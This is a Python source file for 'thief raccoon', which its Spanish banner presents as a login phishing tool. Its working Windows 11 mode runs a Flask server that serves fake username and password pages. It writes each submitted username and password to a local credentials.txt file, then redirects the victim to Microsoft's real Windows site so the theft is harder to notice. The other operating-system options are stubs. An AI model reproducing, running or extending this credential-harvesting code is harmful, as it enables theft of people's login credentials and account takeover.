from flask import Flask, request, render_template, redirect, url_for
import os
from colorama import init, Fore, Style

def display_banner():
    banner = """
              ▄▄▄▄▄▄▄▄
 ▄█▀███▄▄████████████████████▄▄███▀█
 █░░▀████████████████████████████░░█
  █▄░░▀████████████████████████░░░▄▀
   ▀█▄▄████▀▀▀░░░░██░░░▀▀▀█████▄▄█▀
   ▄███▀▀░░░░░░░░░██░░░░░░░░░▀███▄
  ▄██▀░░░░░▄▄▄██▄▄██░▄██▄▄▄░░░░░▀██▄
▄██▀░░░▄▄▄███▄██████████▄███▄▄▄░░░▀█▄
▀██▄▄██████████▀░███▀▀▀█████████▄▄▄█▀
  ▀██████████▀░░░███░░░▀███████████▀
    ▀▀▀██████░░░█████▄░░▀██████▀▀         Versio: 1.0.0
         ▀▀▀▀▄░░█████▀░▄█▀▀▀              Dev: @davenisc
              ▀▀▄▄▄▄▄▀▀                   Web: https://davenisc.com
 _______ _     _          ___    ______                                    
(_______) |   (_)        / __)  (_____ \                                   
    _   | |__  _ _____ _| |__    _____) )_____  ____ ____ ___   ___  ____  
   | |  |  _ \| | ___ (_   __)  |  __  /(____ |/ ___) ___) _ \ / _ \|  _ \ 
   | |  | | | | | ____| | |     | |  \ \/ ___ ( (__( (__| |_| | |_| | | | |
   |_|  |_| |_|_|_____) |_|     |_|   |_\_____|\____)____)___/ \___/|_| |_|
                                                                           
       
thief raccoon - Herramienta para Phishing de inicio de sesion
    """
    print(banner)

def display_menu():
    menu = f"""
Seleccione el sistema operativo para el phishing:
{Fore.GREEN}1. Windows 10
{Fore.BLUE}2. Windows 11
{Fore.YELLOW}3. Windows XP
{Fore.CYAN}4. Windows Server
{Fore.MAGENTA}5. Ubuntu
{Fore.RED}6. Ubuntu Server
{Fore.WHITE}7. macOS
{Style.RESET_ALL}Ingrese el número de su elección: """
    choice = input(menu)
    return choice

def phishing_windows_11():
    app = Flask(__name__)

    @app.route('/')
    def index():
        return render_template('username.html')

    @app.route('/username', methods=['POST'])
    def username():
        username = request.form['username']
        return render_template('password.html', username=username)

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form['username']
        password = request.form['password']
        # Guardar los datos en un archivo
        with open('credentials.txt', 'a') as f:
            f.write(f'Username: {username}, Password: {password}\n')
        return redirect('https://www.microsoft.com/en-us/windows')

    app.run(port=5000)

def phishing_windows_10():
    print("Próximamente, phishing para Windows 10")

def phishing_windows_xp():
    print("Próximamente, phishing para Windows XP")

def phishing_windows_server():
    print("Próximamente, phishing para Windows Server")

def phishing_ubuntu():
    print("Próximamente, phishing para Ubuntu")

def phishing_ubuntu_server():
    print("Próximamente, phishing para Ubuntu Server")

def phishing_macos():
    print("Próximamente, phishing para macOS")

def main():
    display_banner()
    choice = display_menu()
    if choice == '1':
        phishing_windows_10()
    elif choice == '2':
        phishing_windows_11()
    elif choice == '3':
        phishing_windows_xp()
    elif choice == '4':
        phishing_windows_server()
    elif choice == '5':
        phishing_ubuntu()
    elif choice == '6':
        phishing_ubuntu_server()
    elif choice == '7':
        phishing_macos()
    else:
        print("Selección no válida. Por favor, elija una opción del 1 al 7.")

if __name__ == "__main__":
    main()